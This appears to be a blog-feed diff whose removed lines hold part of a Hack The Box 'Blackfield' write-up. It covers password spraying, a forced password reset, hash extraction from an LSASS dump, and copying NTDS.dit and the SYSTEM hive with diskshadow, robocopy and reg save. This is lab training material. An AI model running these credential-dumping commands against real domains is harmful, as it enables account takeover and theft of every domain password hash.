-<p>we find that the usernames we found in the <code class="language-plaintext highlighter-rouge">profiles$</code> have different <code class="language-plaintext highlighter-rouge">SamAccountNames</code> and that’s why they weren’t authenticating.</p>
-
-<h3 id="kerberoasting--asreproasting">Kerberoasting &amp; ASREPRoasting</h3>
-
-<p>we use the new AD user list to launch another <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack but get no new results.</p>
-
-<p>we also try <code class="language-plaintext highlighter-rouge">Kerberoasting</code> but find no entries:</p>
-
-<p><img src="/assets/Blackfield/kerberoast.jpg" alt="kerberoast" /></p>
-
-<h3 id="pattern-guessing--password-spraying">Pattern guessing &amp; Password Spraying</h3>
-
-<p>I use <code class="language-plaintext highlighter-rouge">crackmapexec</code> to get the password policy of the domain before doing any spraying</p>
-
-<p><img src="/assets/Blackfield/pass-pol.jpg" alt="pass-pol" /></p>
-
-<p>Looks like there’s no account lockout at all :D</p>
-
-<p>I spray with the full AD userlist from <code class="language-plaintext highlighter-rouge">GetADUsers.py</code> with the <code class="language-plaintext highlighter-rouge">support</code> password and some variants like: <code class="language-plaintext highlighter-rouge">#01^BlackKnight</code> but get nothing either :/</p>
-
-<h3 id="bloodhound--abusing-the-forcechangepassword-right">Bloodhound &amp; Abusing the <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> right</h3>
-
-<p>I then use <code class="language-plaintext highlighter-rouge">bloodhound</code> to get a look at what I can do with the support account. And I notice that I can reset the password for the <code class="language-plaintext highlighter-rouge">audit2020</code> user:</p>
-
-<p><img src="/assets/Blackfield/force-change-password-right.jpg" alt="force-change-password-right" /></p>
-
-<p>I find this right by clicking the <code class="language-plaintext highlighter-rouge">First Degree Object Control</code> box under the <code class="language-plaintext highlighter-rouge">Node Info</code> tab as highlighted in the image above.</p>
-
-<p><em>By right-clicking the link,</em> I find the <code class="language-plaintext highlighter-rouge">PowerView</code> command that I can run to abuse this right. This is awesome!</p>
-
-<p><img src="/assets/Blackfield/link-help.jpg" alt="link-help" /></p>
-
-<p><img src="/assets/Blackfield/abuse-help.jpg" alt="abuse-help" /></p>
-
-<p><em>it says that by using the command</em> <code class="language-plaintext highlighter-rouge">Set-DomainUserPassword</code>, we can reset the password for the <code class="language-plaintext highlighter-rouge">audit2020</code> account and be able to use it.</p>
-
-<h3 id="using-a-windows-machine-to-do-the-deed">Using a Windows machine to do the deed</h3>
-
-<p>We can do so by using a <code class="language-plaintext highlighter-rouge">Windows</code> host. We can run the <code class="language-plaintext highlighter-rouge">RunAs.exe</code> utility with the <code class="language-plaintext highlighter-rouge">/netonly</code> flag. That would let us use a set of credentials in the network’s context and be able to do stuff.</p>
-
-<p>But we first have to set the DNS on both the <code class="language-plaintext highlighter-rouge">Ethernet</code> and <code class="language-plaintext highlighter-rouge">OpenVPN</code> interfaces:</p>
-
-<p><img src="/assets/Blackfield/setting-dns-on-interfaces.jpg" alt="setting-dns-on-interfaces" /></p>
-
-<p>we can then authenticate to the network as the <code class="language-plaintext highlighter-rouge">support</code> user and we are able to list the <strong>SMB</strong> shares:</p>
-
-<p><img src="/assets/Blackfield/runas-netonly.jpg" alt="runas-netonly" /></p>
-
-<p>we import <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> and use the <code class="language-plaintext highlighter-rouge">Set-DomainUserPassword</code> with the <code class="language-plaintext highlighter-rouge">-Domain</code> flag and use the <code class="language-plaintext highlighter-rouge">-Verbose</code> flag (<em>in case we need to troubleshoot</em>). Making sure to have the password <em>complex enough</em> and casting it to a <code class="language-plaintext highlighter-rouge">Secure String</code> object using the <code class="language-plaintext highlighter-rouge">ConvertTo-SecureString</code> <strong>PowerShell</strong> cmdlet.</p>
-
-<p>The command does take some time… But we’re successful in resetting the password to <code class="language-plaintext highlighter-rouge">Password123!</code> in the end :D</p>
-
-<p><img src="/assets/Blackfield/audit-2020-reset.jpg" alt="audit-2020-reset" /></p>
-
-<h3 id="smb-forensic-share-enumeration">SMB forensic share enumeration</h3>
-
-<p><em>Using the new password,</em> we find that we can now read the <code class="language-plaintext highlighter-rouge">forensic</code> share.</p>
-
-<p><img src="/assets/Blackfield/audit-2020-share-access.jpg" alt="audit-2020-share-access" /></p>
-
-<p><em>after mounting it,</em> we see that there’s a very interesting file that we can access in the <code class="language-plaintext highlighter-rouge">memory_analysis</code> folder. That is <code class="language-plaintext highlighter-rouge">lsass.zip</code>.</p>
-
-<h3 id="a-brief-about-lsass">A brief about LSASS</h3>
-
-<p><strong>LSASS.exe</strong> is the main authentication process in <strong>Windows</strong>. This process holds the credentials of all users who had logged into the computer using one way or another.</p>
-
-<p><img src="/assets/Blackfield/mounting-forensic-share.jpg" alt="mounting-forensic-share" /></p>
-
-<p>we unzip the <code class="language-plaintext highlighter-rouge">lsass.zip</code> file to find a <code class="language-plaintext highlighter-rouge">.DMP</code> file which is a memory dump of the process.</p>
-
-<p><img src="/assets/Blackfield/lsass-dmp.jpg" alt="lsass-dmp" /></p>
-
-<h3 id="extracting-credentials-from-lsass-dump">Extracting credentials from LSASS dump</h3>
-
-<p>we can use a tool called <code class="language-plaintext highlighter-rouge">pypykatz</code> (https://github.com/skelsec/pypykatz) to obtain hashes from the <code class="language-plaintext highlighter-rouge">.DMP</code> files.</p>
-
-<p><code class="language-plaintext highlighter-rouge">pypykatz lsa minidump lsass.DMP</code> is the command.</p>
-
-<p>We do a <code class="language-plaintext highlighter-rouge">grep</code> for the <strong>NT</strong> field for the <strong>NTLM hash</strong> and use the <code class="language-plaintext highlighter-rouge">-B</code> flag to get th 3 lines before it to get the usernames.</p>
-
-<p><img src="/assets/Blackfield/pypkatz.jpg" alt="pypkatz" /></p>
-
-<p>we find hashes for both the <code class="language-plaintext highlighter-rouge">Administrator</code> user and <code class="language-plaintext highlighter-rouge">svc_backup</code> accounts</p>
-
-<p><em>Sadly,</em> the hash for the <code class="language-plaintext highlighter-rouge">administrator</code> account didn’t work, but the one for <code class="language-plaintext highlighter-rouge">svc_backup</code> did. And it also had access to <strong>PowerShell Remoting</strong> :)</p>
-
-<p><img src="/assets/Blackfield/svc_backup_shell.jpg" alt="svc_backup_shell" /></p>
-
-<h3 id="abusing-the-sebackupprivilege-held-by-the-backup-operators-ad-group">Abusing the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> held by the <code class="language-plaintext highlighter-rouge">Backup Operators</code> AD Group</h3>
-
-<p><em>checking the group memberships on the</em> <code class="language-plaintext highlighter-rouge">svc_backup</code> <em>user,</em> we notice it’s a member of the <code class="language-plaintext highlighter-rouge">Backup Operators</code> group. <em>And, by extension,</em> it has the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>.</p>
-
-<p><img src="/assets/Blackfield/sebackup-priv.jpg" alt="sebackup-priv" /></p>
-
-<p>Having this privilege is very dangerous. This is because the ability to backup files includes a full <code class="language-plaintext highlighter-rouge">READ</code> access to most files on the system. The most critical being <code class="language-plaintext highlighter-rouge">NTDS.dit</code> which is the database where the usernames and hashes are stored within a <strong>Domain Controller</strong>.</p>
-
-<p>Being able to grab the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> and the <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry hive would enable us to read all the hashes of the domain <em>including the</em> <strong>domain administrator’s</strong> <em>one.</em></p>
-
-<p><em>By doing some research,</em> we come across this awesome post from <strong>Hacking Articles</strong> (https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) that tells us how we can abuse this privilege.</p>
-
-<h3 id="diskshadow">Diskshadow</h3>
-
-<p>We will be using the <code class="language-plaintext highlighter-rouge">diskshadow</code> command line utility with the <code class="language-plaintext highlighter-rouge">/s</code> flag for script mode and passing a script file as an argument.</p>
-
-<p>The content should be something like:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set context persistent nowriters
-add volume c: alias abuse
-create
-expose %abuse% z:
-</code></pre></div></div>
-
-<p>this would essentially expose a <em>shadow</em> copy of the <code class="language-plaintext highlighter-rouge">c:</code> drive to another drive <code class="language-plaintext highlighter-rouge">z:</code>.</p>
-
-<p>This is required because a file like <code class="language-plaintext highlighter-rouge">NTDS.dit</code> is constantly undergoing <code class="language-plaintext highlighter-rouge">READ</code> and <code class="language-plaintext highlighter-rouge">WRITE</code> operations which would make copying it infeasable under normal circumstances.</p>
-
-<h3 id="changing-encoding-to-match-windows">Changing encoding to match Windows</h3>
-
-<p><em>Having created this script file in</em> <strong>Linux</strong>, we will need to change its encoding to fit <strong>Windows</strong> for it to work properly. This can be done using the <code class="language-plaintext highlighter-rouge">unix2dos</code> command:</p>
-
-<p><img src="/assets/Blackfield/abuse-dsh.jpg" alt="abuse-dsh" /></p>
-
-<p>notice how the output of <code class="language-plaintext highlighter-rouge">file</code> command changes from <code class="language-plaintext highlighter-rouge">ASCII text</code> to <code class="language-plaintext highlighter-rouge">ASCII text, with CRLF line terminators</code> after conversion.</p>
-
-<p>we upload the <code class="language-plaintext highlighter-rouge">.dsh</code> file using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">upload</code> function. And, we change to a writable directory <code class="language-plaintext highlighter-rouge">c:\windows\temp</code> where we can run the utility:</p>
-
-<p><img src="/assets/Blackfield/diskshadow-success.jpg" alt="diskshadow-success" /></p>
-
-<p>it succeeds and we can list the contents of <code class="language-plaintext highlighter-rouge">c:</code> from <code class="language-plaintext highlighter-rouge">z:</code></p>
-
-<h3 id="special-copying-mode-backup-mode">Special copying mode: <code class="language-plaintext highlighter-rouge">Backup Mode</code></h3>
-
-<p><em>to be able to get a copy of</em> <code class="language-plaintext highlighter-rouge">NTDS.dit</code> <em>from</em> <code class="language-plaintext highlighter-rouge">z:\</code>, we would need to use the <code class="language-plaintext highlighter-rouge">Robocopy</code> command-line utility with <code class="language-plaintext highlighter-rouge">/b</code> flag for <code class="language-plaintext highlighter-rouge">backup mode</code>. This would basically allow the copying to bypass the <code class="language-plaintext highlighter-rouge">ACLs</code> of the file if the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> was held.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robocopy /?
-
--------------------------------------------------------------------------------
-   ROBOCOPY     ::     Robust File Copy for Windows
--------------------------------------------------------------------------------
-
-  Started : 18 April 2022 20:10:47
-              Usage :: ROBOCOPY source destination [file [file]...] [options]
-             source :: Source Directory (drive:\path or \\server\share\path).
-        destination :: Destination Dir  (drive:\path or \\server\share\path).
-               file :: File(s) to copy  (names/wildcards: default is "*.*").
-
-::
-:: Copy options :
-::
-
-                 /S :: copy Subdirectories, but not empty ones.
-                 /E :: copy subdirectories, including Empty ones.
-             /LEV:n :: only copy the top n LEVels of the source directory tree.
-                 /Z :: copy files in restartable mode.
-                 /B :: copy files in Backup mode.  &lt;-------------
-                /ZB :: use restartable mode; if access denied use Backup mode.
-                 /J :: copy using unbuffered I/O (recommended for large files).
-            /EFSRAW :: copy all encrypted files in EFS RAW mode.
-</code></pre></div></div>
-
-<p><em>using the command:</em> <code class="language-plaintext highlighter-rouge">robocopy /b z:\windows\ntds . ntds.dit</code>, the copy is a success! :D</p>
-
-<p><img src="/assets/Blackfield/got-ntds-dit.jpg" alt="got-ntds-dit" /></p>
-
-<p>we can then use the <code class="language-plaintext highlighter-rouge">reg</code> command with the <code class="language-plaintext highlighter-rouge">save</code> option to get the <code class="language-plaintext highlighter-rouge">SYSTEM</code> hive:</p>
-
-<p><code class="language-plaintext highlighter-rouge">reg save hklm\system c:\windows\Temp\system</code></p>
-
-<p><img src="/assets/Blackfield/got-system-hive.jpg" alt="got-system-hive" /></p>
-
-<h3 id="hashes-everywhere">Hashes everywhere</h3>
-
-<p>we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> <code class="language-plaintext highlighter-rouge">download</code> functionality to retrieve the files to our kali machine. where can use <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> script to dump all the contents.</p>
-
-<p><em>And down all the hashes go…</em></p>
-
-<p><img src="/assets/Blackfield/secrets-dump.jpg" alt="secrets-dump" /></p>
-
-<p><em>having the domain administrator’s hash,</em> we can easily remote in using <strong>PowerShell Remoting</strong> and we’re admin on the box :D</p>
-
-<p><img src="/assets/Blackfield/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
